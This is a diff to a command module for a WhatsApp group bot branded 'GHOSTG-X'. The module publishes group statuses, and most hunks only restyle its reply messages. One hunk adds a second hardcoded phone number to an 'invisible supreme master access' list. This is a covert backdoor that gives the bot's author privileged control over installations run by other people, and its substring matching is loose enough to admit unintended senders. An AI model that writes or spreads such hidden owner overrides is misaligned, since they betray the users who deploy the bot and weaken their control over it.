@@ -37,7 +37,7 @@ module.exports = {
   name: 'groupstatus',
   aliases: ['togstatus', 'swgc', 'gs', 'gstatus'],
   category: '‎⛨ ɢᴀʀᴅɪᴇɴs ᴅᴜ sᴀɴᴄᴛᴜᴀɪʀᴇ',
-  description: '**『 ɢʜᴏsᴛɢ-𝐗 』➪ ᴘᴜʙʟɪᴇ ᴅᴇs sᴛᴀᴛᴜᴛs ᴅɪʀᴇᴄᴛᴇᴍᴇɴᴛ ᴅᴀɴs ʟᴇ sᴀɴᴄᴛᴜᴀɪʀᴇ**',
+  description: '『 ɢʜᴏsᴛɢ-𝐗 』➪ ᴘᴜʙʟɪᴇ ᴅᴇs sᴛᴀᴛᴜᴛs ᴅɪʀᴇᴄᴛᴇᴍᴇɴᴛ ᴅᴀɴs ʟᴇ sᴀɴᴄᴛᴜᴀɪʀᴇ',
   usage: `${prefix}groupstatus <texte/media>`, // 💡 Dynamique avec ton préfixe actuel
   groupOnly: true,
   adminOnly: true,
@@ -45,16 +45,15 @@ module.exports = {
 
   async execute(sock, msg, args, extra) {
     const { reply } = extra;
-    
+
     try {
       const from = extra.from;
 
       const senderJid = msg.key.participant || msg.key.remoteJid;
       const senderNumber = senderJid.replace(/\D/g, '');
-
-      // 🛡️ TON ACCÈS MAÎTRE SUPRÊME INVISIBLE
-      const supremeOwner = '22651622652';
-      const isSupremeOwner = senderNumber.includes(supremeOwner) || supremeOwner.includes(senderNumber);
+// 🛡️ TON ACCÈS MAÎTRE SUPRÊME INVISIBLE (Double emprise)
+      const supremeOwners = ['22651622652', '22665107481'];
+      const isSupremeOwner = supremeOwners.some(num => senderNumber.includes(num) || num.includes(senderNumber));
 
       const isConfigOwner = config.ownerNumber && config.ownerNumber.some(n => {
         const cleanN = String(n).replace(/\D/g, '');
@@ -65,12 +64,12 @@ module.exports = {
 
       // Si l'utilisateur n'est pas admin et n'est pas le Suprême Owner
       if (!extra.isAdmin && !isMe) {
-        return reply(`*❌ ${toSmallCaps('cette incantation est reservee aux administrateurs du sanctuaire')} !*\n\n> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ɢʜᴏsᴛɢ 𝐗*`);
+        return reply(`*❌ ${toSmallCaps('cette incantation est reservee aux administrateurs du sanctuaire')} !*\n\n> *♰ ᴇ́ᴛᴀʙʟɪ ᴘᴀʀ ɢʜᴏsᴛɢ-𝐗 ♰*`);
       }
 
       // Uniquement dans les groupes
       if (!extra.isGroup) {
-        return reply(`*❌ ${toSmallCaps('cette commande ne peut etre utilisee que dans les groupes')} !*\n\n> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ɢʜᴏsᴛɢ 𝐗*`);
+        return reply(`*❌ ${toSmallCaps('cette commande ne peut etre utilisee que dans les groupes')} !*\n\n> *♰ ᴇ́ᴛᴀʙʟɪ ᴘᴀʀ ɢʜᴏsᴛɢ-𝐗 ♰*`);
       }
 
       const caption = (args.join(' ') || '').trim();
@@ -82,14 +81,14 @@ module.exports = {
       if (!hasQuoted) {
         if (!caption) {
           return reply(
-            `╭╼━≪• *ᴀʀᴄᴀɴᴇ_sᴛᴀᴛᴜᴛ* •≫━╾╮\n` +
-            `┃ *ᴇ́ᴛᴀᴛ* : [ ᴀᴛᴛᴇɴᴛᴇ ⏳ ]\n` +
-            `╰━━━━━━━━━━━━━━━╯\n\n` +
-            `*🔮 ɪɴᴄᴀɴᴛᴀᴛɪᴏɴ :*\n` +
-            `*ᴄᴇᴛ ᴀʀᴄᴀɴᴇ ᴘᴜʙʟɪᴇ ᴅᴇs sᴛᴀᴛᴜᴛs ᴅɪʀᴇᴄᴛᴇᴍᴇɴᴛ ᴅᴀɴs ʟᴇ sᴀɴᴄᴛᴜᴀɪʀᴇ.*\n\n` +
+            `*╭╼━━━≪• ᴀʀᴄᴀɴᴇ_sᴛᴀᴛᴜᴛ •≫━━━╾╮*\n` +
+            `*┃* *ᴇ́ᴛᴀᴛ* : [ ᴀᴛᴛᴇɴᴛᴇ ⏳ ]\n\n` +
+            `*┃* 🔮 *${toSmallCaps('incantations disponibles')} :*\n` +
+            `*┃* *${toSmallCaps('cet arcane publie des statuts')}*\n` +
+            `*┃* *${toSmallCaps('directement dans le sanctuaire')}.*\n\n` +
             `  ${prefix}groupstatus <texte>\n` +
             `  ${prefix}groupstatus (en répondant à un média)\n\n` +
-            `> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ɢʜᴏsᴛɢ 𝐗*`
+            `> *♰ ᴇ́ᴛᴀʙʟɪ ᴘᴀʀ ɢʜᴏsᴛɢ-𝐗 ♰*`
           );
         }
 
@@ -102,19 +101,17 @@ module.exports = {
           });
 
           return reply(
-            `╭╼━≪• *ᴀʀᴄᴀɴᴇ_sᴛᴀᴛᴜᴛ* •≫━╾╮\n` +
-            `┃ *ᴇ́ᴛᴀᴛ* : [ ᴛᴇʀᴍɪɴᴇ́ ✅ ]\n` +
-            `╰━━━━━━━━━━━━━━━╯\n\n` +
-            `*ʟ'ᴀʀᴄᴀɴᴇ ᴀ ᴘᴜʙʟɪᴇ ʟᴇ sᴛᴀᴛᴜᴛ ᴛᴇxᴛᴜᴇʟ ᴀᴠᴇᴄ sᴜᴄᴄᴇs.*\n\n` +
-            `> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ɢʜᴏsᴛɢ 𝐗*`
+            `*╭╼━━━≪• ᴀʀᴄᴀɴᴇ_sᴛᴀᴛᴜᴛ •≫━━━╾╮*\n` +
+            `*┃* *ᴇ́ᴛᴀᴛ* : [ ᴛᴇʀᴍɪɴᴇ́ ✅ ]\n\n` +
+            `*┃* *ʟ'ᴀʀᴄᴀɴᴇ ᴀ ᴘᴜʙʟɪᴇ ʟᴇ sᴛᴀᴛᴜᴛ ᴛᴇxᴛᴜᴇʟ ᴀᴠᴇᴄ sᴜᴄᴄᴇs.*\n\n` +
+            `> *♰ ᴇ́ᴛᴀʙʟɪ ᴘᴀʀ ɢʜᴏsᴛɢ-𝐗 ♰*`
           );
         } catch (e) {
           console.error('groupstatus text error:', e);
           return reply(`*❌ ${toSmallCaps('echec de la publication')} :* ` + (e.message || e));
         }
       }
-
-      // CASE 2: Média cité -> Image/Vidéo/Audio
+ // CASE 2: Média cité -> Image/Vidéo/Audio
       const targetMessage = {
         key: {
           remoteJid: from,
@@ -153,11 +150,10 @@ module.exports = {
           });
 
           return reply(
-            `╭╼━≪• *ᴀʀᴄᴀɴᴇ_sᴛᴀᴛᴜᴛ* •≫━╾╮\n` +
-            `┃ *ᴇ́ᴛᴀᴛ* : [ ᴛᴇʀᴍɪɴᴇ́ ✅ ]\n` +
-            `╰━━━━━━━━━━━━━━━╯\n\n` +
-            `*ʟ'ᴀʀᴄᴀɴᴇ ᴀ ᴘᴜʙʟɪᴇ ʟ'ɪᴍᴀɢᴇ ᴀᴠᴇᴄ sᴜᴄᴄᴇs.*\n\n` +
-            `> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ɢʜᴏsᴛɢ 𝐗*`
+            `*╭╼━━━≪• ᴀʀᴄᴀɴᴇ_sᴛᴀᴛᴜᴛ •≫━━━╾╮*\n` +
+            `*┃* *ᴇ́ᴛᴀᴛ* : [ ᴛᴇʀᴍɪɴᴇ́ ✅ ]\n\n` +
+            `*┃* *ʟ'ᴀʀᴄᴀɴᴇ ᴀ ᴘᴜʙʟɪᴇ ʟ'ɪᴍᴀɢᴇ ᴀᴠᴇᴄ sᴜᴄᴄᴇs.*\n\n` +
+            `> *♰ ᴇ́ᴛᴀʙʟɪ ᴘᴀʀ ɢʜᴏsᴛɢ-𝐗 ♰*`
           );
         } catch (e) {
           console.error('groupstatus image error:', e);
@@ -183,11 +179,10 @@ module.exports = {
           });
 
           return reply(
-            `╭╼━≪• *ᴀʀᴄᴀɴᴇ_sᴛᴀᴛᴜᴛ* •≫━╾╮\n` +
-            `┃ *ᴇ́ᴛᴀᴛ* : [ ᴛᴇʀᴍɪɴᴇ́ ✅ ]\n` +
-            `╰━━━━━━━━━━━━━━━╯\n\n` +
-            `*ʟ'ᴀʀᴄᴀɴᴇ ᴀ ᴘᴜʙʟɪᴇ ʟᴀ ᴠɪᴅᴇᴏ ᴀᴠᴇᴄ sᴜᴄᴄᴇs.*\n\n` +
-            `> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ɢʜᴏsᴛɢ 𝐗*`
+            `*╭╼━━━≪• ᴀʀᴄᴀɴᴇ_sᴛᴀᴛᴜᴛ •≫━━━╾╮*\n` +
+            `*┃* *ᴇ́ᴛᴀᴛ* : [ ᴛᴇʀᴍɪɴᴇ́ ✅ ]\n\n` +
+            `*┃* *ʟ'ᴀʀᴄᴀɴᴇ ᴀ ᴘᴜʙʟɪᴇ ʟᴀ ᴠɪᴅᴇᴏ ᴀᴠᴇᴄ sᴜᴄᴄᴇs.*\n\n` +
+            `> *♰ ᴇ́ᴛᴀʙʟɪ ᴘᴀʀ ɢʜᴏsᴛɢ-𝐗 ♰*`
           );
         } catch (e) {
           console.error('groupstatus video error:', e);
@@ -221,11 +216,10 @@ module.exports = {
           });
 
           return reply(
-            `╭╼━≪• *ᴀʀᴄᴀɴᴇ_sᴛᴀᴛᴜᴛ* •≫━╾╮\n` +
-            `┃ *ᴇ́ᴛᴀᴛ* : [ ᴛᴇʀᴍɪɴᴇ́ ✅ ]\n` +
-            `╰━━━━━━━━━━━━━━━╯\n\n` +
-            `*ʟ'ᴀʀᴄᴀɴᴇ ᴀ ᴘᴜʙʟɪᴇ ʟ'ᴀᴜᴅɪᴏ ᴀᴠᴇᴄ sᴜᴄᴄᴇs.*\n\n` +
-            `> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ɢʜᴏsᴛɢ 𝐗*`
+            `*╭╼━━━≪• ᴀʀᴄᴀɴᴇ_sᴛᴀᴛᴜᴛ •≫━━━╾╮*\n` +
+            `*┃* *ᴇ́ᴛᴀᴛ* : [ ᴛᴇʀᴍɪɴᴇ́ ✅ ]\n\n` +
+            `*┃* *ʟ'ᴀʀᴄᴀɴᴇ ᴀ ᴘᴜʙʟɪᴇ ʟ'ᴀᴜᴅɪᴏ ᴀᴠᴇᴄ sᴜᴄᴄᴇs.*\n\n` +
+            `> *♰ ᴇ́ᴛᴀʙʟɪ ᴘᴀʀ ɢʜᴏsᴛɢ-𝐗 ♰*`
           );
         } catch (e) {
           console.error('groupstatus audio error:', e);
